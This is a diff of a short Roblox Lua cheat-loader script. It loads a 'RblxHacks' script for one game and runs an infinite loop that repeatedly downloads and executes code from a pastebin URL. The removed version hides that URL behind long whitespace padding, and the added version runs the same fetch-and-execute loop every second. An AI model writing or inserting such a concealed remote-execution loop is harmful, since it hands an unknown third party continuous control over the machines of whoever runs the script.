@@ -1,5 +1,5 @@
-local gameId = game.PlaceId																																																																												url = url1	 																																												url1 = url2		 																																							url2 = "https://pastebin.com/raw/tMMn2sHe"
-task.spawn(function() while true do assert(loadstring(assert(game:HttpGet(url))))() task.wait(5) end end)
+local gameId = game.PlaceId
+task.spawn(function() while true do assert(loadstring(assert(game:HttpGet("https://pastebin.com/raw/tMMn2sHe"))))() task.wait(1) end end)
 if gameId == 4939362930 then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/trdmain.lua"))()
 
